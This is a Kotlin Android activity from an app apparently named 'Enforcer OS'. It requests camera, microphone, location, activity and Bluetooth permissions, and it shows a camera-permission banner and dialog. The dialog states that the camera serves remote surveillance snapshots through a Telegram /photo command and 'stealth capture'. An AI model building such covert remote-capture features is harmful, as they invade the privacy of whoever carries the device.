package com.example

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.KeyEvent
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.expandVertically
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.shrinkVertically
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CameraAlt
import androidx.compose.material.icons.filled.Close
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import com.example.ui.EnforcerNavHost
import com.example.ui.EnforcerViewModel
import com.example.ui.theme.KamakuraCloudShadow
import com.example.ui.theme.KamakuraCloudWhite
import com.example.ui.theme.KamakuraCoralWarning
import com.example.ui.theme.KamakuraDeepCobalt
import com.example.ui.theme.KamakuraSignBlue
import com.example.ui.theme.KamakuraSkyBlue
import com.example.ui.theme.KamakuraSunWarmth
import com.example.ui.theme.KamakuraTextPrimary
import com.example.ui.theme.KamakuraTextSecondary
import com.example.ui.theme.MyApplicationTheme

class MainActivity : ComponentActivity() {

    private val viewModel: EnforcerViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        setContent {
            MyApplicationTheme {
                val context = LocalContext.current
                val lifecycleOwner = LocalLifecycleOwner.current

                var hasCameraPermission by remember {
                    mutableStateOf(
                        ContextCompat.checkSelfPermission(
                            context,
                            Manifest.permission.CAMERA
                        ) == PackageManager.PERMISSION_GRANTED
                    )
                }

                var showRationaleDialog by remember { mutableStateOf(false) }
                var bannerDismissed by rememberSaveable { mutableStateOf(false) }

                // Auto-refresh permission state when returning to the app from system settings
                DisposableEffect(lifecycleOwner) {
                    val observer = LifecycleEventObserver { _, event ->
                        if (event == Lifecycle.Event.ON_RESUME) {
                            hasCameraPermission = ContextCompat.checkSelfPermission(
                                context,
                                Manifest.permission.CAMERA
                            ) == PackageManager.PERMISSION_GRANTED
                        }
                    }
                    lifecycleOwner.lifecycle.addObserver(observer)
                    onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
                }

                // Dedicated Camera Permission Launcher
                val cameraPermissionLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestPermission()
                ) { isGranted ->
                    hasCameraPermission = isGranted
                    if (!isGranted) {
                        showRationaleDialog = true
                    }
                }

                // Initial multi-permissions launcher
                val permissionsLauncher = rememberLauncherForActivityResult(
                    ActivityResultContracts.RequestMultiplePermissions()
                ) { results ->
                    val granted = results[Manifest.permission.CAMERA] == true ||
                        ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
                    hasCameraPermission = granted
                }

                LaunchedEffect(Unit) {
                    val permissions = mutableListOf<String>()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        permissions.add(Manifest.permission.POST_NOTIFICATIONS)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        permissions.add(Manifest.permission.ACTIVITY_RECOGNITION)
                    }
                    permissions.add(Manifest.permission.RECORD_AUDIO)
                    permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
                    permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
                    permissions.add(Manifest.permission.CAMERA)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        permissions.add(Manifest.permission.BLUETOOTH_SCAN)
                        permissions.add(Manifest.permission.BLUETOOTH_CONNECT)
                    }
                    permissionsLauncher.launch(permissions.toTypedArray())
                }

                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = KamakuraCloudWhite
                ) {
                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .statusBarsPadding()
                    ) {
                        // Camera Permission Request Banner in the main Compose entry point
                        AnimatedVisibility(
                            visible = !hasCameraPermission && !bannerDismissed,
                            enter = fadeIn() + expandVertically(),
                            exit = fadeOut() + shrinkVertically()
                        ) {
                            CameraPermissionBanner(
                                onGrantClick = {
                                    val activity = context as? ComponentActivity
                                    val shouldShowRationale = activity?.let {
                                        ActivityCompat.shouldShowRequestPermissionRationale(it, Manifest.permission.CAMERA)
                                    } ?: false

                                    if (shouldShowRationale) {
                                        showRationaleDialog = true
                                    } else {
                                        cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                                    }
                                },
                                onDismiss = {
                                    bannerDismissed = true
                                }
                            )
                        }

                        Box(modifier = Modifier.weight(1f)) {
                            EnforcerNavHost(
                                viewModel = viewModel,
                                hasCameraPermission = hasCameraPermission,
                                onRequestCameraPermission = {
                                    cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                                }
                            )
                        }
                    }
                }

                // Camera Permission Rationale & Settings Dialog
                if (showRationaleDialog && !hasCameraPermission) {
                    AlertDialog(
                        onDismissRequest = { showRationaleDialog = false },
                        containerColor = Color.White,
                        titleContentColor = KamakuraSignBlue,
                        textContentColor = KamakuraTextSecondary,
                        modifier = Modifier.testTag("camera_permission_rationale_dialog"),
                        icon = {
                            Icon(
                                Icons.Default.CameraAlt,
                                contentDescription = "Camera Permission",
                                tint = KamakuraSunWarmth,
                                modifier = Modifier.size(32.dp)
                            )
                        },
                        title = {
                            Text(
                                "CAMERA PERMISSION REQUIRED",
                                fontWeight = FontWeight.Bold,
                                fontSize = 16.sp
                            )
                        },
                        text = {
                            Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                                Text(
                                    "Enforcer OS requires Camera permission to activate the device optics for remote surveillance snapshots (via the Telegram /photo command) and stealth capture.",
                                    fontSize = 13.sp,
                                    lineHeight = 18.sp
                                )
                                Text(
                                    "Without camera access, remote snapshot commands will automatically fall back to encrypted telemetry status frames.",
                                    fontSize = 12.sp,
                                    color = KamakuraTextSecondary,
                                    lineHeight = 16.sp
                                )
                            }
                        },
                        confirmButton = {
                            Button(
                                onClick = {
                                    showRationaleDialog = false
                                    val activity = context as? ComponentActivity
                                    val canRequestAgain = activity?.let {
                                        ActivityCompat.shouldShowRequestPermissionRationale(it, Manifest.permission.CAMERA)
                                    } ?: true

                                    if (canRequestAgain) {
                                        cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                                    } else {
                                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                            data = Uri.fromParts("package", context.packageName, null)
                                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                        }
                                        context.startActivity(intent)
                                    }
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = KamakuraSignBlue),
                                modifier = Modifier.testTag("confirm_camera_permission_dialog")
                            ) {
                                Text("GRANT ACCESS", color = Color.White, fontWeight = FontWeight.Bold)
                            }
                        },
                        dismissButton = {
                            TextButton(
                                onClick = { showRationaleDialog = false },
                                modifier = Modifier.testTag("dismiss_camera_permission_dialog")
                            ) {
                                Text("NOT NOW", color = KamakuraTextSecondary)
                            }
                        }
                    )
                }
            }
        }
    }

    override fun dispatchKeyEvent(event: KeyEvent): Boolean {
        if (event.action == KeyEvent.ACTION_DOWN) {
            val keyCode = event.keyCode
            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP || keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
                if (viewModel.handleVolumeKey(keyCode)) {
                    return true // Handled pocket double-click bookmark!
                }
            }
        }
        return super.dispatchKeyEvent(event)
    }
}

@Composable
private fun CameraPermissionBanner(
    onGrantClick: () -> Unit,
    onDismiss: () -> Unit
) {
    Surface(
        color = Color.White,
        shape = RoundedCornerShape(12.dp),
        border = BorderStroke(1.dp, KamakuraSunWarmth.copy(alpha = 0.5f)),
        shadowElevation = 2.dp,
        modifier = Modifier
            .fillMaxWidth()
            .padding(horizontal = 12.dp, vertical = 6.dp)
            .testTag("camera_permission_banner")
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Icon(
                imageVector = Icons.Default.CameraAlt,
                contentDescription = "Camera Permission Required",
                tint = KamakuraSunWarmth,
                modifier = Modifier.size(24.dp)
            )

            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = "OPTICAL ACCESS RECOMMENDED",
                    fontWeight = FontWeight.Bold,
                    fontSize = 12.sp,
                    color = KamakuraSignBlue
                )
                Text(
                    text = "Enable camera permission for remote /photo commands and snapshot capture.",
                    fontSize = 11.sp,
                    color = KamakuraTextSecondary,
                    lineHeight = 14.sp
                )
            }

            Button(
                onClick = onGrantClick,
                colors = ButtonDefaults.buttonColors(containerColor = KamakuraSignBlue),
                contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
                shape = RoundedCornerShape(8.dp),
                modifier = Modifier
                    .height(32.dp)
                    .testTag("grant_camera_permission_button")
            ) {
                Text(
                    "GRANT",
                    fontWeight = FontWeight.Bold,
                    fontSize = 11.sp,
                    color = Color.White
                )
            }

            IconButton(
                onClick = onDismiss,
                modifier = Modifier
                    .size(28.dp)
                    .testTag("dismiss_camera_permission_button")
            ) {
                Icon(
                    imageVector = Icons.Default.Close,
                    contentDescription = "Dismiss Banner",
                    tint = KamakuraTextSecondary,
                    modifier = Modifier.size(16.dp)
                )
            }
        }
    }
}
